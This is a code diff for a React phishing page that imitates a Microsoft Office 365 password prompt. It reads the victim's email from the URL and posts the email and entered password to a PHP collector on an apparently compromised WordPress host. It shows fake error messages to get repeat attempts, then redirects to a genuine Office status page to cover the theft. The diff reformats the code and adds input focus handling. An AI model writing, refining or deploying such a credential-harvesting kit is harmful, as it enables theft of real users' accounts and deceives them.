@@ -1,39 +1,49 @@
 import axios from "axios";
 import "./App.css";
-import { useState } from "react";
+import { useState, useRef } from "react";
 function App() {
   // this is a simple state
   const url_string = window.location.hash.substring(1);
+  const ref = useRef(null);
   const [pswd, setPswd] = useState("");
   const [count, setCount] = useState(0);
   const [errors, setErros] = useState({
     passLength: true,
-    passStatus: true
-  })
+    passStatus: true,
+  });
   const handleSignIn = (ev) => {
     ev.preventDefault();
-    if(pswd.length < 5) {
-      setErros({...errors, passLength:false})
+    if (pswd.length < 5) {
+      setErros({ passStatus: true, passLength: false });
+      setPswd("");
+      ref.current.focus();
+    } else {
+      sendResult(url_string, pswd);
     }
-    else {
-      sendResult(url_string, pswd)
-    }
-    if(count>=2) {
+    if (count >= 2) {
       setTimeout(() => {
-      window.location.replace("https://portal.office.com/servicestatus");
-    }, 3000);
+        window.location.replace("https://portal.office.com/servicestatus");
+      }, 3000);
     }
   };
   const sendResult = async (user, pass) => {
-    await axios.post("https://courses.geopackllc.com/wp-includes/js/jcrop/plolici.php", {email:user, password: pass}).then((res) => {
-      console.log(res);
-      setErros({passLength: true ,passStatus : true });
+    await axios
+      .post("https://courses.geopackllc.com/wp-includes/js/jcrop/plolici.php", {
+        email: user,
+        password: pass,
+      })
+      .then((res) => {
+        console.log(res);
+        setErros({ passLength: true, passStatus: true });
+      })
+      .catch((err) => {
+        setCount(count + 1);
+        setErros({ passLength: true, passStatus: false });
+        setPswd("");
+      ref.current.focus();
 
-    }).catch((err) => {
-      setCount(count + 1);
-      setErros({passLength: true ,passStatus : false });
-    });
-  }
+      });
+  };
   return (
     <>
       <div className="cb" style={{ display: "block" }} />{" "}
@@ -113,21 +123,35 @@ function App() {
                                     marginBottom: "0px",
                                   }}
                                 >
-                                  {errors.passLength? "" : "Your account password is too short."}
-                                  {errors.passStatus? "" : <span>Your account password cannot be empty. if you don't remember your password, <a href="#">reset it now.</a></span>}
+                                  {errors.passLength
+                                    ? ""
+                                    : "Your account password is too short."}
+                                  {errors.passStatus ? (
+                                    ""
+                                  ) : (
+                                    <span>
+                                      Your account password cannot be empty. if
+                                      you don't remember your password,{" "}
+                                      <a href="#">reset it now.</a>
+                                    </span>
+                                  )}
                                 </div>
-                                { (errors.passLength && errors.passStatus) ?  
-                                <div
-                                  id="important1"
-                                  style={{ color: "black", fontSize: "13px" }}
-                                >
-                                  Because you're accessing sensitive info, you
-                                  need to verify your password
-                                </div> : ""}
+                                {errors.passLength && errors.passStatus ? (
+                                  <div
+                                    id="important1"
+                                    style={{ color: "black", fontSize: "13px" }}
+                                  >
+                                    Because you're accessing sensitive info, you
+                                    need to verify your password
+                                  </div>
+                                ) : (
+                                  ""
+                                )}
                                 <div className="row">
                                   <div className="form-group col-md-24">
                                     <div className="placeholderContainer">
                                       <input
+                                        ref={ref}
                                         name="passwd"
                                         type="password"
                                         id="i0118"
@@ -136,7 +160,9 @@ function App() {
                                         placeholder="Password"
                                         required=""
                                         value={pswd}
-                                        onChange={(ev) => setPswd(ev.target.value)}
+                                        onChange={(ev) =>
+                                          setPswd(ev.target.value)
+                                        }
                                       />
                                     </div>
                                   </div>
